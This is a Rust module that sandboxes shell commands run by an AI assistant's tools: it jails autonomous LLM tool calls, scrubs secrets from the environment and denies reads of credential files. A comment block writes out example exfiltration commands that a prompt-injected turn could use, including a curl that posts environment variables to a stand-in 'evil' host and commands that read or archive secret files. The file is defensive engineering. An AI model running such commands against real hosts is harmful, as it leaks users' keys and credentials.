//! OS-level execution isolation for the governed ToolHost (Phase B2).
//!
//! The fluers [`LocalSessionEnv`] confines file *paths* (fd-anchored `openat`
//! walks) but is explicitly **not** an OS sandbox — its own `SECURITY.md` says
//! `curl | sh` still reaches the whole host, and `bash` child processes run
//! with the daemon's full ambient authority. On macOS the Swift `DamageControl`
//! layer backfilled some of that; headless Linux has nothing. This module adds
//! the missing tier: an OS-enforced jail around `exec` so a tool's shell
//! children can only *write* under the workspace root (+ the system temp dirs),
//! while read/glob/grep and the daemon itself are untouched.
//!
//! Design (scope §3 of the B2 handoff): a Fae-owned [`JailedSessionEnv`] wraps
//! the fluers [`LocalSessionEnv`] and delegates every method **except**
//! [`exec`](SessionEnv::exec) unchanged (they are already fd-anchored to the
//! root). `exec` is intercepted so the child runs inside an OS sandbox:
//!
//! * **macOS** — the command is wrapped in `/usr/bin/sandbox-exec -p <profile>`
//!   with a generated seatbelt profile (`(deny default)`, write allowed only
//!   under the resolved root + temp dirs, read/process/network allowed). The
//!   wrapped command is still run through the inner env's fd-anchored `cwd`
//!   pinning, so the path TOCTOU protection is preserved.
//! * **Linux** — the [`landlock`] crate restricts filesystem *write* access to
//!   the root (+ `/tmp`), applied in a `pre_exec` hook (after fork, before exec)
//!   so only the child is confined, never the daemon. The ruleset fd is built in
//!   the parent (no allocation in the fork child); the child only issues the
//!   `landlock_restrict_self` syscall and refuses to `exec` if the kernel did
//!   not actually enforce it.
//!
//! [`IsolationMode`] is selected per execution from the request's
//! [`ToolOrigin`]: non-interactive origins (proactive / scheduler / auto-skill /
//! script-block) **require** [`Jailed`](IsolationMode::Jailed); an owner's
//! interactive turn may run [`Host`](IsolationMode::Host). If a required jail
//! cannot be enforced (old kernel, missing `sandbox-exec`) the ToolHost **fails
//! closed** — it denies rather than silently running unconfined.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use async_trait::async_trait;
use fluers_runtime::env::ShellResult;
use fluers_runtime::{LocalSessionEnv, RuntimeResult, SessionEnv};
// `RuntimeError` is only constructed on the Linux jail path + the unsupported-
// platform fallback; on macOS `exec` delegates and never names it.
#[cfg(not(target_os = "macos"))]
use fluers_runtime::RuntimeError;
use tokio_util::sync::CancellationToken;

/// Which isolation tier a tool call runs under.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IsolationMode {
    /// Runs against the bare fluers env (path-confined only). The daemon's
    /// ambient authority is available to `bash` children.
    Host,
    /// Runs inside an OS sandbox that confines `bash` child writes to the
    /// workspace root (+ system temp). Requires an available backend.
    Jailed,
}

impl IsolationMode {
    /// Short static label for the audit row.
    #[must_use]
    pub fn as_label(self) -> &'static str {
        match self {
            IsolationMode::Host => "host",
            IsolationMode::Jailed => "jailed",
        }
    }

    /// Whether this mode needs an OS sandbox backend to be present.
    #[must_use]
    pub fn requires_backend(self) -> bool {
        matches!(self, IsolationMode::Jailed)
    }
}

/// Where a tool call originated. Drives the required [`IsolationMode`]: only an
/// owner's interactive turn may run on the host; every autonomous origin must be
/// jailed (an LLM acting without a human in the loop must not have the daemon's
/// ambient authority).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ToolOrigin {
    /// A verified owner's interactive turn (may run [`Host`](IsolationMode::Host)).
    OwnerInteractive,
    /// A proactive/awareness-driven turn (no human in the loop).
    Proactive,
    /// A scheduler task.
    Scheduler,
    /// An auto-generated (`auto-`) skill.
    AutoSkill,
    /// A `<tool_program>` script block.
    ScriptBlock,
    /// (Phase F1) A tool call issued by the daemon's native jailed agentic loop
    /// (`fae.delegate`). The LLM drives it with no human in the loop, so — like
    /// every other autonomous origin — it MUST run under the OS jail.
    Delegated,
}

impl ToolOrigin {
    /// The isolation tier this origin is required to run under.
    #[must_use]
    pub fn required_isolation(self) -> IsolationMode {
        match self {
            ToolOrigin::OwnerInteractive => IsolationMode::Host,
            ToolOrigin::Proactive
            | ToolOrigin::Scheduler
            | ToolOrigin::AutoSkill
            | ToolOrigin::ScriptBlock
            | ToolOrigin::Delegated => IsolationMode::Jailed,
        }
    }
}

/// The macOS seatbelt driver. Present on stock macOS; its absence is the
/// fail-closed trigger for both the jailed tier and the Host-tier `bash` wrap.
#[cfg(target_os = "macos")]
pub(crate) const SANDBOX_EXEC_PATH: &str = "/usr/bin/sandbox-exec";

/// The daemon-authoritative security tier of a canonical path (L3 of the
/// security-override design). Precedence, strictest first:
/// **Fae-Integrity > Secrets > General**. The daemon RE-DERIVES this from the
/// canonical target and IGNORES the advisory `tier` a Swift override carries.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SecurityTier {
    /// Fae's own trust anchors — NEVER overridable (hard-reject): the Git Vault,
    /// `speakers.json`, `directive.md`, the installed `models.lock`, and the
    /// grant-store file.
    FaeIntegrity,
    /// Owner-owned credential files/dirs (`~/.secrets`, `~/.ssh`, …). Overridable
    /// only `once`/`expiring`; a Secrets unlock also loses network + non-workspace
    /// writes for that one call (L5).
    Secrets,
    /// Any other path. A General unlock keeps normal network/writes.
    General,
}

/// Home-relative Fae-Integrity ("never") members. Both the `fae` and `fae-dev`
/// data dirs are covered so the dev profile is protected identically. `models.lock`
/// and `grant-store.json` are ADDED here (they were missing from the daemon's
/// protected set before the security-override work).
fn fae_integrity_relative() -> &'static [&'static str] {
    &[
        ".fae-vault",
        ".fae-vault-dev",
        "Library/Application Support/fae/speakers.json",
        "Library/Application Support/fae/directive.md",
        "Library/Application Support/fae/models.lock",
        "Library/Application Support/fae/grant-store.json",
        "Library/Application Support/fae-dev/speakers.json",
        "Library/Application Support/fae-dev/directive.md",
        "Library/Application Support/fae-dev/models.lock",
        "Library/Application Support/fae-dev/grant-store.json",
    ]
}

/// Home-relative Secrets members — the credential set the seatbelt already denies.
fn secrets_relative() -> &'static [&'static str] {
    &[
        ".secrets",
        ".env",
        ".envrc",
        ".saorsa-keys",
        ".ssh",
        ".gnupg",
        ".aws",
        ".azure",
        ".kube",
        ".docker/config.json",
        ".netrc",
        ".npmrc",
        ".pypirc",
    ]
}

/// Classify an already-`realpath`-canonicalized path into its daemon-authoritative
/// [`SecurityTier`]. Fae-Integrity wins over Secrets wins over General (strictest
/// match). A canonical path that equals OR is under a member is that member's tier
/// (so a file under `~/.ssh` classifies Secrets; a file under `~/.fae-vault`
/// classifies Fae-Integrity). The advisory tier a Swift override supplies is never
/// consulted — this is the single source of truth (L3).
#[must_use]
pub fn classify_canonical_tier(canonical: &Path, home: &str) -> SecurityTier {
    let home = home.trim_end_matches('/');
    let matches = |rels: &[&str]| -> bool {
        rels.iter().any(|r| {
            let full = format!("{home}/{r}");
            let cf = canonical_path(&full);
            let member = Path::new(&cf);
            canonical == member || canonical.starts_with(member)
        })
    };
    if matches(fae_integrity_relative()) {
        return SecurityTier::FaeIntegrity;
    }
    if matches(secrets_relative()) {
        return SecurityTier::Secrets;
    }
    SecurityTier::General
}

/// A validated, single-call read-deny relaxation (the daemon-minted result of an
/// approved `security_override`). Only ever constructed AFTER every L-rule gate
/// passed in [`ToolHost`](crate::toolhost::ToolHost); the profile builder consumes
/// it to relax EXACTLY one canonical file leaf (never a directory prefix), and —
/// for a Secrets-tier unlock — to also deny network + non-workspace writes (L5).
#[derive(Debug, Clone)]
pub struct HostBashRelax {
    /// The canonical (symlink/`..`-resolved) FILE whose read-deny is lifted.
    pub canonical_target: PathBuf,
    /// Secrets-tier ⇒ the profile also denies `network*` and non-workspace/tmp
    /// writes for this one call. General-tier ⇒ `false` (normal network/writes).
    pub deny_network: bool,
    /// The canonical workspace root (the only dir writes stay allowed under when
    /// `deny_network` is set).
    pub workspace_root: PathBuf,
}

/// Is an OS sandbox backend available on this host?
///
/// Drives the fail-closed decision: when a call *requires* [`Jailed`] but this
/// returns `false`, the ToolHost denies rather than degrading to [`Host`].
///
/// [`Jailed`]: IsolationMode::Jailed
/// [`Host`]: IsolationMode::Host
#[must_use]
pub fn jail_backend_available() -> bool {
    #[cfg(target_os = "macos")]
    {
        // `sandbox-exec` is the seatbelt entry point; present on stock macOS.
        Path::new(SANDBOX_EXEC_PATH).is_file()
    }
    #[cfg(target_os = "linux")]
    {
        landlock_available()
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        false
    }
}

/// A [`SessionEnv`] that runs `exec` inside an OS sandbox confined to `root`.
///
/// Reads/writes/glob/grep delegate to the inner fluers [`LocalSessionEnv`]
/// unchanged (already fd-anchored to the root). Only `exec` is intercepted.
pub struct JailedSessionEnv {
    inner: Arc<LocalSessionEnv>,
    /// The resolved (canonical) real root — the sandbox write boundary.
    root: PathBuf,
}

impl JailedSessionEnv {
    /// Wrap `inner` (an env rooted at `real_root`) with OS-sandboxed `exec`.
    /// `real_root` MUST be the canonical on-disk root (the sandbox profile /
    /// landlock ruleset are generated from it verbatim).
    #[must_use]
    pub fn new(inner: Arc<LocalSessionEnv>, real_root: PathBuf) -> Self {
        Self {
            inner,
            root: real_root,
        }
    }
}

#[async_trait]
impl SessionEnv for JailedSessionEnv {
    async fn read_file(
        &self,
        path: &Path,
        max_lines: usize,
        max_bytes: usize,
    ) -> RuntimeResult<String> {
        self.inner.read_file(path, max_lines, max_bytes).await
    }

    async fn read_file_full(&self, path: &Path, max_bytes: usize) -> RuntimeResult<String> {
        self.inner.read_file_full(path, max_bytes).await
    }

    async fn write_file(&self, path: &Path, content: &str) -> RuntimeResult<()> {
        self.inner.write_file(path, content).await
    }

    async fn glob(&self, pattern: &str, limit: usize) -> RuntimeResult<Vec<String>> {
        self.inner.glob(pattern, limit).await
    }

    async fn grep(
        &self,
        pattern: &str,
        paths: &[&str],
        max_matches: usize,
    ) -> RuntimeResult<Vec<String>> {
        self.inner.grep(pattern, paths, max_matches).await
    }

    async fn exec(
        &self,
        command: &str,
        cwd: &Path,
        timeout_ms: Option<u64>,
        cancel: &CancellationToken,
    ) -> RuntimeResult<ShellResult> {
        #[cfg(target_os = "macos")]
        {
            self.exec_jailed_macos(command, cwd, timeout_ms, cancel)
                .await
        }
        #[cfg(target_os = "linux")]
        {
            self.exec_jailed_linux(command, cwd, timeout_ms, cancel)
                .await
        }
        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            let _ = (command, cwd, timeout_ms, cancel);
            Err(RuntimeError::Sandbox(
                "execution isolation is unavailable on this platform".into(),
            ))
        }
    }
}

// ---------------------------------------------------------------------------
// macOS: seatbelt (sandbox-exec)
// ---------------------------------------------------------------------------

#[cfg(target_os = "macos")]
impl JailedSessionEnv {
    /// Wrap `command` in `sandbox-exec` and run it through the inner env's
    /// fd-anchored `cwd` pinning (so the path TOCTOU protection is preserved).
    async fn exec_jailed_macos(
        &self,
        command: &str,
        cwd: &Path,
        timeout_ms: Option<u64>,
        cancel: &CancellationToken,
    ) -> RuntimeResult<ShellResult> {
        let profile = seatbelt_profile(&self.root);
        // C1: the jailed shell must NOT inherit the daemon's provider secrets
        // (`FAE_OPENROUTER_API_KEY`, the ACP keys). fluers' `LocalSessionEnv::exec`
        // spawns `sh` with the daemon's full ambient env and offers no env seam,
        // so scrub at the command level instead: run the whole sandboxed pipeline
        // under `/usr/bin/env -i <allowlist>`. `env -i` clears the environment
        // unconditionally — it can never fall back to the full env (fail-closed) —
        // and we re-add only the vetted, non-secret allowlist (`crate::child_env`,
        // the SAME map the Linux jail applies via `env_clear() + envs(...)`).
        //
        // The inner env runs `sh -c "<wrapped>"`; `<wrapped>` scrubs the env, then
        // invokes sandbox-exec with the profile and the original command, each
        // single-quoted for the outer shell.
        let wrapped = format!(
            "{} /usr/bin/sandbox-exec -p {} /bin/sh -c {}",
            scrubbed_env_i_prefix(),
            sh_single_quote(&profile),
            sh_single_quote(command),
        );
        self.inner.exec(&wrapped, cwd, timeout_ms, cancel).await
    }
}

/// Build the `/usr/bin/env -i K=V …` prefix that scrubs a child's environment
/// down to the shared allowlist (`crate::child_env::scrubbed_child_env`). Each
/// `K=V` is single-quoted for the outer shell, so an arbitrary value (spaces,
/// quotes, `$VAR`, backticks) reaches `env` as one exact literal argv element —
/// `env -i` then applies them as the *complete* environment. This is the
/// command-level twin of the Linux jail's `env_clear() + envs(scrubbed_child_env())`;
/// because `env -i` always clears first, even an empty allowlist fails closed
/// (the child runs with an empty env, never the daemon's secrets). Used by the
/// macOS jailed `exec` and by the Host-tier `bash` wrap on both macOS and Linux.
#[cfg(any(target_os = "macos", target_os = "linux"))]
fn scrubbed_env_i_prefix() -> String {
    let mut parts = vec!["/usr/bin/env".to_string(), "-i".to_string()];
    let mut pairs: Vec<(String, String)> =
        crate::child_env::scrubbed_child_env().into_iter().collect();
    // Deterministic argv order (the map is unordered); purely cosmetic.
    pairs.sort();
    for (k, v) in pairs {
        parts.push(sh_single_quote(&format!("{k}={v}")));
    }
    parts.join(" ")
}

/// Generate a seatbelt profile that denies by default, allows reads / process
/// exec / network broadly, and allows *writes* only under `root` and the system
/// temp dirs.
#[cfg(target_os = "macos")]
fn seatbelt_profile(root: &Path) -> String {
    // Write-allowed subpaths: the workspace root + the temp dirs (commands
    // legitimately scribble in $TMPDIR / /tmp) + /dev (null, tty, …).
    let mut write_subpaths: Vec<String> = vec![root.to_string_lossy().into_owned()];
    if let Ok(tmp) = std::fs::canonicalize(std::env::temp_dir()) {
        write_subpaths.push(tmp.to_string_lossy().into_owned());
    }
    for p in ["/private/tmp", "/private/var/folders", "/dev"] {
        write_subpaths.push(p.to_string());
    }
    let writes = write_subpaths
        .iter()
        .map(|p| format!("    (subpath {})", seatbelt_quote(p)))
        .collect::<Vec<_>>()
        .join("\n");
    format!(
        "(version 1)\n\
         (deny default)\n\
         (allow process*)\n\
         (allow signal)\n\
         (allow sysctl-read)\n\
         (allow mach-lookup)\n\
         (allow file-read*)\n\
         (allow network*)\n\
         (allow file-write*\n{writes}\n)\n"
    )
}

/// Quote a string as a seatbelt (TinyScheme) double-quoted literal.
#[cfg(target_os = "macos")]
fn seatbelt_quote(s: &str) -> String {
    let escaped = s.replace('\\', "\\\\").replace('"', "\\\"");
    format!("\"{escaped}\"")
}

/// Quote a string for safe inclusion inside a `sh -c` command.
#[cfg(any(target_os = "macos", target_os = "linux"))]
fn sh_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

// ---------------------------------------------------------------------------
// Host-tier `bash` hardening (C1 env scrub + C2 protected-read deny)
// ---------------------------------------------------------------------------
//
// The Host tier (an owner's interactive turn, `parse_tool_origin(None)`) runs the
// fluers `bash` tool over the BARE `LocalSessionEnv`: `sh -c <command>` with the
// daemon's FULL ambient env and NO OS sandbox. That leaves two holes a
// prompt-injected owner turn can exploit:
//
//   * C1 — env exfil: `curl -d "$(printenv)" https://evil` leaks the daemon's
//     `FAE_OPENROUTER_API_KEY` + ACP keys. (The C1 `env_clear` fix only covered
//     the JAILED exec path.)
//   * C2 — protected reads: `cd ~ && cat .secrets`, `cat ~/.sec*`,
//     `f=.secrets; cat ~/$f`, `tar czf /tmp/x ~` read credential/identity files.
//     The substring `DamageControlPolicy` gate is trivially evadable; only a
//     kernel read-deny is sound.
//
// [`wrap_host_bash_command`] rewrites the `bash` command so it runs env-scrubbed
// AND (on macOS) under a seatbelt profile that denies reads of the protected
// paths, while `(allow default)` keeps legitimate bash working (project files,
// tools, network, workspace writes). Only `bash` is wrapped — read/write/edit/
// glob/grep are fluers fd-anchored + path-confined already.

/// Rewrite a Host-tier `bash` command so it runs env-scrubbed and — on macOS —
/// under a seatbelt profile that denies reads of the protected paths.
///
/// `home` is the daemon's resolved home dir (drives the protected-path set).
///
/// # macOS
/// Wraps as `/usr/bin/env -i <allowlist> /usr/bin/sandbox-exec -p <read-deny
/// profile> /bin/sh -c <original>`. **Fails closed** (`Err`) if `home` is
/// unknown (the protected set cannot be derived) or if `sandbox-exec` is missing
/// (the read-deny cannot be enforced) — it NEVER degrades to an unsandboxed exec.
///
/// # Linux
/// Wraps as `/usr/bin/env -i <allowlist> /bin/sh -c <original>`. The env scrub
/// closes C1. A protected-READ-deny for a general shell is **not expressible in
/// Landlock** (it is grant-based, not deny-based), so on Linux the read-deny is a
/// documented residual — the substring `DamageControlPolicy` remains the only read
/// gate there. This does NOT claim Linux read-deny.
///
/// # Errors
/// A `&'static str` deny-reason label when isolation cannot be enforced (macOS
/// only); the caller maps it to a fail-closed `Denied`.
#[cfg(target_os = "macos")]
pub fn wrap_host_bash_command(
    command: &str,
    home: Option<&str>,
    relax: Option<&HostBashRelax>,
    network_denied_root: Option<&Path>,
) -> Result<String, &'static str> {
    // Fail closed: without a home dir the protected set is empty — refuse rather
    // than run a bash that could read `~/.secrets` unguarded.
    let Some(home) = home.filter(|h| !h.is_empty()) else {
        return Err("host_bash_home_unresolved");
    };
    // Fail closed: without the seatbelt driver we cannot deny protected reads.
    if !Path::new(SANDBOX_EXEC_PATH).is_file() {
        return Err("host_bash_sandbox_unavailable");
    }
    // `relax` is `None` for every un-overridden call ⇒ the read set is byte-identical
    // to today's full read-deny (Invariant F). A validated relaxation lifts EXACTLY
    // one canonical file leaf. Network confinement is set for a Secrets-tier override
    // (L5) OR — independently — a network-tainted turn (FLAW-1): a subsequent bash
    // after an approved Secrets read runs network-denied + workspace-write-only.
    let relax_target = relax.map(|r| r.canonical_target.as_path());
    let network_confine: Option<&Path> = match relax {
        Some(r) if r.deny_network => Some(r.workspace_root.as_path()),
        _ => network_denied_root,
    };
    let profile = read_deny_seatbelt_profile_relaxed(home, relax_target, network_confine);
    Ok(format!(
        "{} {} -p {} /bin/sh -c {}",
        scrubbed_env_i_prefix(),
        SANDBOX_EXEC_PATH,
        sh_single_quote(&profile),
        sh_single_quote(command),
    ))
}

/// Linux variant — env scrub only (see the doc on the macOS variant for why the
/// read-deny is a documented Linux residual).
#[cfg(target_os = "linux")]
pub fn wrap_host_bash_command(
    command: &str,
    _home: Option<&str>,
    // The read-deny relaxation is a macOS-seatbelt concept; Linux has no kernel
    // read-deny to relax (documented residual), so an approved override simply has
    // no read-deny profile to modify here. The daemon still validates + audits it.
    _relax: Option<&HostBashRelax>,
    // Network confinement (L5 / FLAW-1 turn taint) is likewise a macOS-seatbelt
    // concept here; Landlock network rules are grant-based + kernel-version gated,
    // so Linux relies on the substring DamageControl guard. Accepted for signature
    // parity; the daemon still validates + audits.
    _network_denied_root: Option<&Path>,
) -> Result<String, &'static str> {
    // C1 (env exfil) is closed by `env -i <allowlist>`. C2 (protected reads) is
    // NOT enforced here: Landlock is grant-based and cannot express a deny-read
    // for an otherwise-unrestricted shell. The substring `DamageControlPolicy`
    // remains the read gate on Linux — do NOT claim a kernel read-deny.
    tracing::warn!(
        "host bash on Linux: env scrubbed (C1 closed); protected-read deny is a \
         documented residual (Landlock is grant-based) — substring DamageControl remains"
    );
    Ok(format!(
        "{} /bin/sh -c {}",
        scrubbed_env_i_prefix(),
        sh_single_quote(command),
    ))
}

/// Unsupported platform — fail closed (parity with the jailed `exec` fallback).
#[cfg(not(any(target_os = "macos", target_os = "linux")))]
pub fn wrap_host_bash_command(
    _command: &str,
    _home: Option<&str>,
    _relax: Option<&HostBashRelax>,
    _network_denied_root: Option<&Path>,
) -> Result<String, &'static str> {
    Err("host_bash_unsupported_platform")
}

/// Home-anchored absolute paths whose file *contents* a Host-tier `bash` is
/// denied to read. Mirrors the Swift `SafeBashExecutor.protectedReadPaths` /
/// `DamageControlPolicy` zero-access set (secrets + credential dirs + Fae
/// identity/backup), kept in sync by hand from the documented protected-path set.
#[cfg(target_os = "macos")]
fn protected_read_paths(home: &str) -> Vec<String> {
    // The full read-deny set = Secrets ∪ Fae-Integrity (the two authoritative tier
    // members). Composed from the SAME lists the tier classifier consults so the
    // deny profile and the tier table can never drift. `models.lock` + the
    // grant-store file are now part of the Fae-Integrity list (added there).
    let home = home.trim_end_matches('/');
    secrets_relative()
        .iter()
        .chain(fae_integrity_relative().iter())
        .map(|r| format!("{home}/{r}"))
        .collect()
}

/// Build a seatbelt profile that allows bash to run normally — read project
/// files, exec tools, use the network, write to the workspace and temp dirs —
/// but denies reading the *contents* of the protected paths. `(allow default)`
/// keeps legitimate bash working; the trailing `(deny file-read* …)` rules win
/// (last match) for the protected subpaths. Both the literal and the canonical
/// (symlink-resolved) form of each path are emitted so a firmlinked/symlinked
/// ancestor (`/var` → `/private/var`) cannot slip a protected read past the deny.
#[cfg(target_os = "macos")]
fn read_deny_seatbelt_profile(home: &str) -> String {
    read_deny_seatbelt_profile_relaxed(home, None, None)
}

/// The read-deny profile, optionally relaxing EXACTLY one canonical file leaf for
/// an approved `security_override`.
///
/// * `relax_target == None` ⇒ no read leaf lifted (Invariant F — the load-bearing
///   "no override = today's behavior" when `network_confine` is also `None`).
/// * `relax_target == Some(t)` ⇒ every protected entry whose canonical form equals
///   `t` is OMITTED from the read-deny set (file-granular — a directory-secret like
///   `~/.ssh` whose canonical form does NOT equal a named sub-file stays fully
///   denied, so a symlink→`~/.ssh/id_rsa` stays blocked).
/// * `network_confine == Some(root)` ⇒ the profile ALSO denies `network*` and
///   confines writes to `root` + temp dirs. This is set BOTH for a Secrets-tier
///   override (L5 — an approved secret read can't be piped to the network in the
///   same command) AND, independently of any override, for a network-tainted turn
///   (FLAW-1 fix — a subsequent bash in the same turn after an approved Secrets
///   read is also network-denied + workspace-write-only, so the read secret can't
///   be exfiltrated by a later split call).
#[cfg(target_os = "macos")]
fn read_deny_seatbelt_profile_relaxed(
    home: &str,
    relax_target: Option<&Path>,
    network_confine: Option<&Path>,
) -> String {
    use std::collections::HashSet;
    let raw = protected_read_paths(home);
    let mut seen: HashSet<String> = HashSet::new();
    let mut paths: Vec<String> = Vec::new();
    for p in &raw {
        let canon = canonical_path(p);
        // File-granular relaxation: drop BOTH spellings of a protected entry iff
        // its literal OR canonical form is exactly the relaxed target. Never a
        // directory prefix — a sub-file of a still-listed directory stays denied.
        if let Some(target) = relax_target {
            if Path::new(p) == target || Path::new(&canon) == target {
                continue;
            }
        }
        for candidate in [p.clone(), canon] {
            if seen.insert(candidate.clone()) {
                paths.push(candidate);
            }
        }
    }
    let denials = paths
        .iter()
        .map(|p| format!("    (subpath {})", seatbelt_quote(p)))
        .collect::<Vec<_>>()
        .join("\n");

    let mut profile = String::from("(version 1)\n(allow default)\n");
    // L5 / FLAW-1: cut network + non-workspace writes for THIS call. `(allow
    // default)` opened both; last-match-wins deny/allow closes them back down to
    // workspace + temp writes and no network.
    if let Some(root) = network_confine {
        profile.push_str("(deny network*)\n");
        let mut write_subpaths: Vec<String> = vec![root.to_string_lossy().into_owned()];
        if let Ok(tmp) = std::fs::canonicalize(std::env::temp_dir()) {
            write_subpaths.push(tmp.to_string_lossy().into_owned());
        }
        for p in ["/private/tmp", "/private/var/folders", "/dev"] {
            write_subpaths.push(p.to_string());
        }
        let writes = write_subpaths
            .iter()
            .map(|p| format!("    (subpath {})", seatbelt_quote(p)))
            .collect::<Vec<_>>()
            .join("\n");
        profile.push_str("(deny file-write* (subpath \"/\"))\n");
        profile.push_str(&format!("(allow file-write*\n{writes}\n)\n"));
    }
    profile.push_str(&format!("(deny file-read*\n{denials}\n)\n"));
    profile
}

/// Resolve `path` to the canonical (fully symlink-resolved) form the kernel
/// matches sandbox rules against. `canonicalize` needs an existing path, so we
/// resolve the deepest existing ancestor and re-append the remaining tail — this
/// handles a protected path that does not yet exist (e.g. no `~/.aws`) and
/// firmlinked prefixes (`/var` → `/private/var`). Returns the input unchanged if
/// nothing resolves (fail safe — the raw form is emitted alongside).
///
/// Cross-platform: the macOS read-deny profile uses it, and the (all-platform)
/// [`classify_canonical_tier`] uses it to canonicalize each tier member.
fn canonical_path(path: &str) -> String {
    let mut existing = PathBuf::from(path);
    let mut tail: Vec<std::ffi::OsString> = Vec::new();
    while !existing.as_os_str().is_empty() && existing != Path::new("/") && !existing.exists() {
        match (existing.file_name(), existing.parent()) {
            (Some(name), Some(parent)) => {
                tail.insert(0, name.to_os_string());
                existing = parent.to_path_buf();
            }
            _ => break,
        }
    }
    let Ok(resolved) = std::fs::canonicalize(&existing) else {
        return path.to_string();
    };
    let mut out = resolved;
    for t in tail {
        out.push(t);
    }
    out.to_string_lossy().into_owned()
}

// ---------------------------------------------------------------------------
// Linux: landlock
// ---------------------------------------------------------------------------

/// Probe whether the running kernel enforces Landlock. Uses a
/// `HardRequirement` ruleset creation at ABI v1 so an unsupported kernel errors
/// (rather than silently degrading, which would be fail-open).
#[cfg(target_os = "linux")]
fn landlock_available() -> bool {
    use landlock::{AccessFs, RulesetAttr, ABI};
    use landlock::{CompatLevel, Compatible, Ruleset};
    Ruleset::default()
        .set_compatibility(CompatLevel::HardRequirement)
        .handle_access(AccessFs::from_write(ABI::V1))
        .and_then(|r| r.create())
        .is_ok()
}

/// Build a ruleset that confines filesystem *writes* to `root` (+ `/tmp`),
/// leaving reads, exec, and network unrestricted (they are not "handled", so
/// Landlock does not mediate them). Built in the parent; the returned handle
/// carries only the ruleset fd, so `restrict_self` in the fork child allocates
/// nothing.
#[cfg(target_os = "linux")]
fn build_write_confined_ruleset(root: &Path) -> RuntimeResult<landlock::RulesetCreated> {
    use landlock::{path_beneath_rules, AccessFs, RulesetAttr, RulesetCreatedAttr, ABI};
    use landlock::{CompatLevel, Compatible, Ruleset};

    let abi = ABI::V1;
    let write = AccessFs::from_write(abi);
    let mut write_dirs: Vec<PathBuf> = vec![root.to_path_buf()];
    if Path::new("/tmp").exists() {
        write_dirs.push(PathBuf::from("/tmp"));
    }
    // `?` coerces each step's error into `RulesetError`; map that once below.
    let build = || -> Result<landlock::RulesetCreated, landlock::RulesetError> {
        Ruleset::default()
            .set_compatibility(CompatLevel::BestEffort)
            .handle_access(write)?
            .create()?
            .add_rules(path_beneath_rules(&write_dirs, write))
    };
    build().map_err(|e| RuntimeError::Sandbox(format!("landlock ruleset build failed: {e}")))
}

#[cfg(target_os = "linux")]
impl JailedSessionEnv {
    /// Spawn `command` with a Landlock write-confinement applied in a
    /// `pre_exec` hook, replicating the inner env's timeout/cancel handling.
    // `pre_exec` is an inherently unsafe API; this is the crate's single
    // sanctioned unsafe block (see the SAFETY comment at the call site).
    #[allow(unsafe_code)]
    async fn exec_jailed_linux(
        &self,
        command: &str,
        cwd: &Path,
        timeout_ms: Option<u64>,
        cancel: &CancellationToken,
    ) -> RuntimeResult<ShellResult> {
        use landlock::{RulesetCreated, RulesetStatus};
        use std::io;
        use tokio::process::Command;

        let dir = self.resolve_cwd(cwd)?;
        // Build the ruleset in the PARENT (opens the path fds, no allocation in
        // the fork child). A fresh ruleset per exec — `restrict_self` consumes it.
        let ruleset = build_write_confined_ruleset(&self.root)?;
        let mut cell: Option<RulesetCreated> = Some(ruleset);

        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(command)
            .current_dir(&dir)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        // C1: a jailed tool must NOT inherit the daemon's provider secrets
        // (Landlock confines writes only, network is open). Clear the inherited
        // env and re-add only the vetted allowlist.
        cmd.env_clear();
        cmd.envs(crate::child_env::scrubbed_child_env());
        // SAFETY: the closure only issues the `landlock_restrict_self` syscall
        // (+ prctl) on an fd built in the parent — no allocation, no shared-lock
        // acquisition — so it is safe in the post-fork, pre-exec child.
        unsafe {
            cmd.pre_exec(move || {
                let ruleset = cell
                    .take()
                    .ok_or_else(|| io::Error::other("landlock ruleset already consumed"))?;
                let status = ruleset
                    .restrict_self()
                    .map_err(|e| io::Error::other(format!("landlock restrict_self failed: {e}")))?;
                // Fail closed: if the kernel did not actually enforce the jail,
                // refuse to exec rather than run unconfined.
                if matches!(status.ruleset, RulesetStatus::NotEnforced) {
                    return Err(io::Error::other(
                        "landlock not enforced by kernel; refusing to run unconfined",
                    ));
                }
                Ok(())
            });
        }

        let mut child = cmd.spawn().map_err(RuntimeError::Io)?;

        let timeout_ms_value = timeout_ms;
        let timeout_fut = match timeout_ms {
            Some(ms) => Box::pin(tokio::time::sleep(std::time::Duration::from_millis(ms)))
                as std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send>>,
            None => Box::pin(std::future::pending()),
        };
        let cancel_fut = cancel.cancelled();

        tokio::select! {
            _ = timeout_fut => {
                let _ = child.kill().await;
                Ok(ShellResult {
                    exit_code: 124,
                    stdout: String::new(),
                    stderr: format!("command timed out after {}ms", timeout_ms_value.unwrap_or(0)),
                })
            }
            _ = cancel_fut => {
                let _ = child.kill().await;
                Err(RuntimeError::Sandbox("command cancelled".into()))
            }
            status = child.wait() => {
                let status = status.map_err(RuntimeError::Io)?;
                let output = child.wait_with_output().await.map_err(RuntimeError::Io)?;
                Ok(ShellResult {
                    exit_code: status.code().unwrap_or(-1),
                    stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
                    stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
                })
            }
        }
    }

    /// Resolve a relative `cwd` against the real root, rejecting absolute paths
    /// and `..` (defense-in-depth; the write jail confines writes regardless).
    fn resolve_cwd(&self, cwd: &Path) -> RuntimeResult<PathBuf> {
        use std::path::Component;
        let mut out = self.root.clone();
        for comp in cwd.components() {
            match comp {
                Component::CurDir => {}
                Component::Normal(p) => out.push(p),
                Component::RootDir | Component::Prefix(_) => {
                    return Err(RuntimeError::Sandbox(format!(
                        "absolute cwd is not allowed: `{}`",
                        cwd.display()
                    )));
                }
                Component::ParentDir => {
                    return Err(RuntimeError::Sandbox(format!(
                        "`..` is not allowed in cwd: `{}`",
                        cwd.display()
                    )));
                }
            }
        }
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn origin_requires_jail_for_non_interactive() {
        assert_eq!(
            ToolOrigin::OwnerInteractive.required_isolation(),
            IsolationMode::Host
        );
        for origin in [
            ToolOrigin::Proactive,
            ToolOrigin::Scheduler,
